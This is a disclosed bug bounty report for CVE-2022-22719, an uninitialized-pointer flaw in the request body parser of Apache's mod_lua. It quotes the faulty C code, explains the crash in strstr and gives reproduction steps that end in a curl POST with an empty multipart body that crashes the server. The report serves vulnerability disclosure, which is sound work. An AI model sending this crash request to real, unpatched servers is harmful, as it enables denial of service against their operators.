# [M] Use of uninitialized value of in req_parsebody method of lua_request.c

## Summary
Severity: Medium
Program: Internet Bug Bounty
Weakness: Uncontrolled Resource Consumption
Reporter: chamal
State: resolved
Disclosed: 2022-03-17T15:01:23.600Z
CVE: CVE-2022-22719
Source: https://hackerone.com/reports/1514863

## Details
###Software Versions
Ubuntu - 18.04 64-bit
Apache 2.4.51 - 64 bit

### Cause of Bug
This bug is present in the `req_parsebody` method of lua_request.c file.
Below mentioned lines of code cause this bug.
```cpp
 const char  *data;
 int         i;
 size_t      vlen = 0;
 size_t      len = 0;
 if (lua_read_body(r, &data, (apr_off_t*) &size, max_post_size) != OK) {
     return 2;
 }
 len = strlen(multipart);
 i = 0;
 for
 (
    start = strstr((char *) data, multipart);
 ```

Note that the `const char  *data` pointer is not initialized with a value.
That pointer is passed to the `lua_read_body` method to store data sent by HTTP request.
If the HTTP request does not contain any data, then a value will not be set for `const char  *data` pointer.
So `const char  *data` pointer will remain uninitialized.

Then `const char  *data` pointer is passed as a parameter to "strstr" function.
Segmentation fault will happen in "strstr" function, if it cannot access memory pointed by `const char  *data` pointer.

**I noticed a difference between Apache 64 bit build and 32 bit build.**
    64 bit build - Pointer value of`const char  *data` pointer is 0x1.
                                So a Segmentation fault happens in `strstr` function.
    32 bit build - Pointer value of `const char  *data` pointer has a valid memory address.
                                 So Segmentation fault does NOT happen in `strstr` function.

###Steps
1. Build Apache web server with Lua module
   `./configure --enable-lua=shared`

2. Enable Lua module with Apache web server.
    Add these lines to httpd.conf file.

```apacheconf
   LoadModule lua_module modules/mod_lua.so

   <Files "*.lua">
    SetHandler lua-script
   </Files>
```

3. Copy attached F1658382 file to htdocs folder.

4. Start Apache web server in debug single worker mode.
   `./httpd -X -d /home/apache/install-directory/`

5. Send this HTTP request with CURL.
   `curl -v -X POST -H 'content-type: multipart/form-data;boundary=-' http://127.0.0.1/test.lua`
    Apache web server will crash. *Note that apache web server is started in single worker mode in step 4.*

** I selected Denial of Service (CWE-400) as weakness type. But correct weakness type should be 	Improper Initialization(CWE-665). It was not available to select.**

## Impact

May be used for a denial of service attack.
